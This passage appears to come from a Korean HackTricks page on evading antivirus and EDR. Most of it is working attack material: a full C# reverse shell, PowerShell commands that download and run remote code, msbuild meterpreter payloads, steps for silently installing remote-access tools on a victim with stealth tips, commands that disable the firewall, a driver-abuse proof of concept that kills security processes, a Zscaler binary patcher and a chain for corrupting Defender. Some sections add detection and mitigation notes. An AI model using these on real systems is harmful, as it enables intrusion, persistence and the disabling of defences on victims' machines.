자신의 프로세스에 post-exploitation 악성 코드를 **인젝션** 하는 방식입니다. 이렇게 하면 새 프로세스를 생성하여 AV 스캔을 피할 필요가 없지만, 페이로드 실행 중 문제가 생기면 프로세스가 크래시할 수 있어 **beacon을 잃을 가능성**이 훨씬 큽니다.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly 로딩에 대해 더 읽고 싶다면 이 글을 확인하세요: [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 및 그들의 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

PowerShell에서도 C# Assemblies를 로드할 수 있습니다. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)와 [S3cur3th1sSh1t의 영상](https://www.youtube.com/watch?v=oe11Q-3Akuk)을 확인하세요.

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)에서 제안된 것처럼, 공격자가 제어하는 SMB 공유에 설치된 인터프리터 환경에 침해된 머신이 접근할 수 있게 하면 다른 언어를 사용하여 악성 코드를 실행할 수 있습니다.

SMB 공유에서 Interpreter Binaries와 환경에 접근을 허용함으로써 침해된 머신의 메모리 내에서 해당 언어들로 **임의의 코드를 실행**할 수 있습니다.

레포에는 다음과 같이 적혀 있습니다: Defender는 여전히 스크립트를 스캔하지만 Go, Java, PHP 등을 이용하면 **정적 시그니처를 우회할 유연성**이 더 생깁니다. 난독화하지 않은 무작위 리버스 쉘 스크립트들로 테스트한 결과 성공을 거두었습니다.

## TokenStomping

Token stomping은 공격자가 액세스 토큰이나 EDR/AV 같은 보안 제품의 토큰을 **조작(manipulate)** 하여 권한을 낮춤으로써 프로세스가 죽지 않으면서도 악성 활동을 확인할 권한을 잃게 만드는 기술입니다.

이를 방지하려면 Windows가 보안 프로세스의 토큰에 대해 외부 프로세스가 핸들을 얻는 것을 **차단**할 수 있어야 합니다.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)에 설명된 것처럼, 피해자 PC에 Chrome Remote Desktop을 배포하고 이를 통해 인수(takeover) 및 지속성(persistence)을 유지하는 것이 쉽습니다:
1. https://remotedesktop.google.com/ 에서 다운로드하고 "Set up via SSH"를 클릭한 뒤 Windows용 MSI 파일을 다운로드하세요.
2. 피해자에서 설치 프로그램을 조용히 실행합니다(관리자 권한 필요): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop 페이지로 돌아가서 다음을 클릭하세요. 마법사가 계속하려면 권한 부여를 요청할 것이며, 계속하려면 Authorize 버튼을 클릭하세요.
4. 약간 조정한 매개변수로 제공된 명령을 실행하세요: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (GUI를 사용하지 않고 pin을 설정할 수 있게 해주는 pin 파라미터에 주의하세요).


## Advanced Evasion

Evasion은 매우 복잡한 주제입니다. 하나의 시스템에서 여러 소스의 텔레메트리를 고려해야 할 때가 많아 성숙한 환경에서는 완전히 탐지되지 않는 상태를 유지하는 것은 사실상 불가능합니다.

각 환경마다 강점과 약점이 다릅니다.

더 많은 Advanced Evasion 기술을 익히려면 [@ATTL4S](https://twitter.com/DaniLJ94)의 이 강연을 꼭 보시길 권합니다.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

his is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 바이너리의 일부를 **제거**하면서 어떤 부분을 Defender가 악성으로 판단하는지 찾아서 분리해줍니다.\
동일한 기능을 제공하는 또 다른 도구는 [**avred**](https://github.com/dobin/avred)이며, 웹 서비스를 통해 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) 에서 제공됩니다.

### **Telnet Server**

Windows10 이전까지는 모든 Windows에 **Telnet server**를 관리자 권한으로 설치할 수 있었습니다:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
시스템이 시작될 때 **시작**하도록 설정하고 지금 **실행**하세요:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet 포트 변경** (스텔스) 및 firewall 비활성화:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (설치 프로그램(setup)이 아닌 bin 다운로드를 받으세요)

**호스트에서**: Execute _**winvnc.exe**_ and configure the server:

- 옵션 _Disable TrayIcon_을 활성화하세요
- _VNC Password_에 암호를 설정하세요
- _View-Only Password_에 암호를 설정하세요

그런 다음, 바이너리 _**winvnc.exe**_와 **새로** 생성된 파일 _**UltraVNC.ini**_를 victim 내부로 옮기세요

#### **Reverse connection**

The attacker should execute inside his host the binary `vncviewer.exe -listen 5900` so it will be prepared to catch a reverse VNC connection. Then, inside the victim: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**경고:** 은밀함을 유지하려면 다음을 하지 마세요

- 이미 `winvnc`가 실행 중일 때 다시 시작하지 마세요. 그렇지 않으면 [popup](https://i.imgur.com/1SROTTl.png)이 발생합니다. 실행 여부는 `tasklist | findstr winvnc`로 확인하세요
- 같은 디렉터리에 `UltraVNC.ini`가 없는 상태에서 `winvnc`를 시작하지 마세요. 그렇지 않으면 [the config window](https://i.imgur.com/rfMQWcf.png)가 열립니다
- 도움말을 위해 `winvnc -h`를 실행하지 마세요. 그러면 [popup](https://i.imgur.com/oc18wcu.png)이 발생합니다

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT 내부:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
이제 `msfconsole -r file.rc`로 **start the lister**하고, 다음과 같이 **xml payload**를 **execute**하세요:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**현재 defender는 프로세스를 매우 빠르게 종료합니다.**

### 우리만의 reverse shell 컴파일

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# Revershell

다음 명령으로 컴파일:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
다음과 함께 사용:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using 컴파일러
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

자동 다운로드 및 실행:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 난독화 도구 목록: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### python을 사용한 인젝터 빌드 예제:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 기타 도구
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 추가

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 커널 공간에서 AV/EDR 종료

Storm-2603는 **Antivirus Terminator**로 알려진 작은 콘솔 유틸리티를 이용해 ransomware를 배포하기 전에 엔드포인트 보호를 비활성화했습니다. 이 도구는 **자체적으로 취약하지만 *서명된* 드라이버**를 포함하고 있으며, 이를 악용해 Protected-Process-Light (PPL) AV 서비스조차 차단할 수 없는 특권 커널 작업을 수행합니다.

핵심 요점
1. **Signed driver**: 디스크에 배달되는 파일은 `ServiceMouse.sys`이지만, 바이너리는 Antiy Labs의 “System In-Depth Analysis Toolkit”에 포함된 정식 서명된 드라이버 `AToolsKrnl64.sys`입니다. 드라이버가 유효한 Microsoft 서명을 가지고 있기 때문에 Driver-Signature-Enforcement (DSE)가 활성화된 상태에서도 로드됩니다.
2. **서비스 설치**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
첫 번째 줄은 드라이버를 **kernel service**로 등록하고 두 번째 줄은 이를 시작하여 `\\.\ServiceMouse`가 user land에서 접근 가능하게 만듭니다.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID로 임의의 프로세스를 종료 (Defender/EDR services 종료에 사용됨) |
| `0x990000D0` | 디스크의 임의 파일 삭제 |
| `0x990001D0` | 드라이버 언로드 및 서비스 제거 |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD는 유저-모드 보호를 완전히 우회합니다; 커널에서 실행되는 코드는 *protected* 프로세스를 열거나 종료하거나 PPL/PP, ELAM 또는 기타 하드닝 기능에 관계없이 커널 객체를 변조할 수 있습니다.

탐지 / 완화
•  Microsoft의 vulnerable-driver 차단 목록(`HVCI`, `Smart App Control`)을 활성화하여 Windows가 `AToolsKrnl64.sys` 로드를 거부하도록 합니다.  
•  새로운 *kernel* 서비스 생성 모니터링 및 드라이버가 world-writable 디렉터리에서 로드되었거나 allow-list에 없는 경우 경고를 발생시킵니다.  
•  사용자 모드 핸들이 custom device 객체에 열리고 이어서 의심스러운 `DeviceIoControl` 호출이 발생하는지 감시합니다.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler의 **Client Connector**는 장치 posture 규칙을 로컬에서 적용하고 Windows RPC를 통해 결과를 다른 구성요소로 전달합니다. 두 가지 취약한 설계 선택으로 인해 완전한 우회가 가능합니다:

1. Posture 평가가 **entirely client-side**에서 이루어집니다 (불리언 값이 서버로 전송됨).  
2. 내부 RPC 엔드포인트는 연결하는 실행파일이 **signed by Zscaler**인지(`WinVerifyTrust`를 통해)만 검증합니다.

디스크에 있는 서명된 바이너리 네 개를 **패치(patching)** 하면 두 메커니즘을 모두 무력화할 수 있습니다:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 항상 `1`을 반환하여 모든 검사에서 준수로 처리됨 |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ 어떤 프로세스(심지어 unsigned)라도 RPC 파이프에 바인드 가능 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret`로 대체됨 |
| `ZSATunnel.exe` | Integrity checks on the tunnel | 단락 처리(short-circuited) |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
원본 파일을 교체하고 서비스 스택을 재시작한 후:

* **모든** posture checks가 **green/compliant**로 표시됩니다.
* 서명되지 않았거나 수정된 바이너리가 named-pipe RPC endpoints를 열 수 있습니다 (예: `\\RPC Control\\ZSATrayManager_talk_to_me`).
* 감염된 호스트는 Zscaler 정책에 의해 정의된 내부 네트워크에 대한 무제한 접근 권한을 얻습니다.

이 사례는 순수히 클라이언트 측 신뢰 결정과 단순한 signature checks가 몇 바이트 패치로 어떻게 무력화될 수 있는지를 보여줍니다.

## Protected Process Light (PPL)을 악용해 LOLBINs로 AV/EDR을 변조하기

Protected Process Light (PPL)은 서명자/레벨 계층을 강제하여 동급 또는 상위 권한의 보호 프로세스만 서로를 변조할 수 있게 합니다. 공격적으로 보면, 합법적으로 PPL-enabled 바이너리를 실행하고 그 인수를 제어할 수 있다면, 정상적인 기능(예: logging)을 AV/EDR에서 사용하는 보호된 디렉터리에 대한 제약된, PPL 기반의 write primitive로 전환할 수 있습니다.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- 사용 예시:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN 프리미티브: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns and accepts a parameter to write a log file to a caller-specified path.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 단축 경로 도움말
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

악용 체인 (개요)
1) Launch the PPL-capable LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` using a launcher (e.g., CreateProcessAsPPL).
2) Pass the ClipUp log-path argument to force a file creation in a protected AV directory (e.g., Defender Platform). Use 8.3 short names if needed.
3) If the target binary is normally open/locked by the AV while running (e.g., MsMpEng.exe), schedule the write at boot before the AV starts by installing an auto-start service that reliably runs earlier. Validate boot ordering with Process Monitor (boot logging).
4) On reboot the PPL-backed write happens before the AV locks its binaries, corrupting the target file and preventing startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
주의사항 및 제약
- ClipUp가 쓰는 내용은 배치(placement) 외에는 제어할 수 없습니다; 이 프리미티브는 정밀한 콘텐츠 주입보다는 손상(corruption)에 적합합니다.
- 로컬 admin/SYSTEM 권한이 필요하며 서비스 설치/시작과 재부팅 시간이 필요합니다.
- 타이밍이 중요합니다: 대상이 열려 있지 않아야 하며, 부팅 시 실행하면 파일 잠금을 피할 수 있습니다.

탐지
- 부팅 전후로 비정상적인 인수로 `ClipUp.exe` 프로세스가 생성되는 경우, 특히 비표준 런처에 의해 부모 프로세스화(parented)된 경우 주의하세요.
- 의심스러운 바이너리를 자동 시작하도록 구성된 새 서비스 및 일관되게 Defender/AV보다 먼저 시작되는 서비스. Defender 시작 실패 이전의 서비스 생성/수정 내역을 조사하세요.
- Defender 바이너리/Platform 디렉터리에 대한 파일 무결성 모니터링; protected-process 플래그를 가진 프로세스에 의한 예상치 못한 파일 생성/수정.
- ETW/EDR 텔레메트리: `CREATE_PROTECTED_PROCESS`로 생성된 프로세스와 비-AV 바이너리에 의한 이상한 PPL 레벨 사용을 확인하세요.

완화 조치
- WDAC/Code Integrity: 어떤 서명된 바이너리가 PPL로 실행될 수 있고 어떤 부모 아래에서 실행될 수 있는지를 제한; 정당한 컨텍스트 외에서의 ClipUp 호출을 차단하세요.
- 서비스 위생: 자동 시작 서비스의 생성/수정 권한을 제한하고 시작 순서 조작을 모니터링하세요.
- Defender tamper protection 및 early-launch 보호가 활성화되어 있는지 확인하고, 바이너리 손상을 나타내는 시작 오류를 조사하세요.
- 보안 툴이 호스팅되는 볼륨에서 8.3 short-name generation을 비활성화하는 것을 고려하되 환경과 호환되는지(철저히 테스트) 확인하세요.

PPL 및 도구 관련 참조
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## 참조

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
